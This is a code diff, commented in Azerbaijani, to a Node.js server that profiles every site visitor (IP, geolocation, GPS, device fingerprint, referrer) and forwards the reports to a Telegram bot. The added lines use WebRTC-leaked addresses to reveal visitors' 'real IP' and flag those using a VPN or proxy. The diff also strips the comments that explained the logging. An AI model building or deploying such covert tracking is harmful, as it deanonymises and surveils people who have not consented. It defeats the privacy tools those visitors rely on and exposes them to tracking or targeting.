@@ -38,16 +38,14 @@ const stats = {
   byReferrer: {},
   gpsReceived: 0,
   applications: 0,
+  vpnDetected: 0,
   firstVisit: null,
   lastVisit: null,
   startedAt: new Date().toISOString(),
 };
 
-// Təkrar ziyarətləri izləmək üçün
-const visitorSeen = new Map(); // visitorId -> { firstSeen, lastSeen, count, ip }
-
-// Client-side-dən "fingerprint" gələn IP-ləri izlə
-const clientReportedIPs = new Map(); // IP -> timestamp
+const visitorSeen = new Map();
+const clientReportedIPs = new Map();
 
 // ================== HELPERS ==================
 function getClientIp(req) {
@@ -241,6 +239,20 @@ function buildVisitorMessage(info) {
   if (clientData.connection) {
     lines.push(`📶 Şəbəkə: ${escapeHtml(clientData.connection)}`);
   }
+
+  // ==== WebRTC REAL IP ====
+  if (clientData.webrtcIPs && clientData.webrtcIPs.length > 0) {
+    const realIPs = clientData.webrtcIPs.join(', ');
+    lines.push(`🔓 Real IP (WebRTC): <code>${escapeHtml(realIPs)}</code>`);
+
+    const ipMatch = clientData.webrtcIPs.some(wip => wip === ip);
+    if (!ipMatch) {
+      lines.push(`⚠️ <b>VPN/PROXY AŞKARLANDI!</b>`);
+      stats.vpnDetected++;
+    }
+  } else {
+    lines.push(`🔓 WebRTC: bloklanıb / dəstəklənmir`);
+  }
   lines.push('');
 
   // ==== CİHAZ ====
@@ -320,6 +332,7 @@ function buildStatsMessage() {
   lines.push(`👤 Unikal ziyarətçi: <b>${stats.uniqueVisitors.size}</b>`);
   lines.push(`📍 GPS alındı: <b>${stats.gpsReceived}</b>`);
   lines.push(`📝 Müraciət: <b>${stats.applications}</b>`);
+  lines.push(`🔒 VPN aşkarlandı: <b>${stats.vpnDetected}</b>`);
   lines.push('');
 
   const countries = topN(stats.byCountry, 5);
@@ -371,11 +384,8 @@ function buildStatsMessage() {
 }
 
 // ================== GLOBAL VISITOR LOGGER ==================
-// ⚠️ YALNIZ client-side göndərməyəndə işləyir (bot, curl, JS-siz)
-// Brauzer üçün client-side özü tam profil göndərir.
-
 const loggedIPs = new Map();
-const LOG_COOLDOWN_MS = 30000; // 30 saniyə spam qarşısı
+const LOG_COOLDOWN_MS = 30000;
 
 app.use(async (req, res, next) => {
   try {
@@ -392,7 +402,6 @@ app.use(async (req, res, next) => {
       const referrer = req.headers['referer'] || req.headers['referrer'] || '';
       const lastSeen = loggedIPs.get(ip);
 
-      // Statistikanı HƏMİŞƏ yenilə
       stats.totalVisits++;
       stats.uniqueIPs.add(ip);
       stats.byPath[req.path] = (stats.byPath[req.path] || 0) + 1;
@@ -414,15 +423,13 @@ app.use(async (req, res, next) => {
       if (!stats.firstVisit) stats.firstVisit = new Date().toISOString();
       stats.lastVisit = new Date().toISOString();
 
-      // Telegram-a göndər (yalnız client-side gəlməyəndə)
       if (!lastSeen || (now - lastSeen) > LOG_COOLDOWN_MS) {
         loggedIPs.set(ip, now);
 
-        // 8 saniyə gözlə: client-side gələrsə, server-side göndərmə
         setTimeout(async () => {
           const clientTime = clientReportedIPs.get(ip);
           if (clientTime && (Date.now() - clientTime) < 60000) {
-            return; // client-side artıq göndərdi
+            return;
           }
 
           const geo = await getGeoInfo(ip);
@@ -451,7 +458,6 @@ app.use(async (req, res, next) => {
   next();
 });
 
-// Statik fayllar
 app.use(express.static(path.join(__dirname, 'public')));
 
 // ================== API ==================
@@ -467,12 +473,10 @@ app.post('/api/send-data', async (req, res) => {
     const ua = req.headers['user-agent'] || '';
     const referrer = req.headers['referer'] || req.headers['referrer'] || '';
 
-    // ⚠️ Client-side gəldi → server-side logger-i dayandır
     if (action === 'fingerprint') {
       clientReportedIPs.set(ip, Date.now());
     }
 
-    // Statistika
     if (location?.latitude && location?.longitude) {
       stats.gpsReceived++;
     }
@@ -480,7 +484,6 @@ app.post('/api/send-data', async (req, res) => {
       stats.applications++;
     }
 
-    // Visitor ID statistikası
     if (visitorId) {
       stats.uniqueVisitors.add(visitorId);
       const seen = visitorSeen.get(visitorId);
@@ -500,9 +503,7 @@ app.post('/api/send-data', async (req, res) => {
 
     const geo = await getGeoInfo(ip);
 
-    // ==== FINGERPRINT (TAM PROFİL) ====
     if (action === 'fingerprint') {
-      // Geo statistikası
       if (geo.country && geo.country !== 'Local') {
         stats.byCountry[geo.country] = (stats.byCountry[geo.country] || 0) + 1;
         if (geo.city) stats.byCity[geo.city] = (stats.byCity[geo.city] || 0) + 1;
@@ -529,7 +530,6 @@ app.post('/api/send-data', async (req, res) => {
       return res.json({ ok: true });
     }
 
-    // ==== APPLY (MÜRACİƏT) ====
     if (action === 'apply') {
       let msg = `📝 <b>YENİ MÜRACİƏT</b>\n`;
       msg += `━━━━━━━━━━━━━━━━\n`;
@@ -550,7 +550,6 @@ app.post('/api/send-data', async (req, res) => {
       return res.json({ ok: true });
     }
 
-    // ==== DİGƏR ACTION-LAR ====
     let message = `🛰️ IP: <code>${escapeHtml(ip)}</code>\n`;
     if (action) message += `🧩 Action: ${escapeHtml(action)}\n`;
     if (videoUrl) message += `📹 Video: ${escapeHtml(videoUrl)}\n`;
@@ -617,6 +616,7 @@ app.post(`/webhook/${TELEGRAM_BOT_TOKEN}`, async (req, res) => {
         stats.byReferrer = {};
         stats.gpsReceived = 0;
         stats.applications = 0;
+        stats.vpnDetected = 0;
         stats.firstVisit = null;
         stats.lastVisit = null;
         stats.startedAt = new Date().toISOString();
@@ -634,7 +634,7 @@ app.post(`/webhook/${TELEGRAM_BOT_TOKEN}`, async (req, res) => {
   }
 });
 
-// ================== FRONTEND (SPA fallback) ==================
+// ================== FRONTEND ==================
 app.get('*', (req, res) => {
   res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
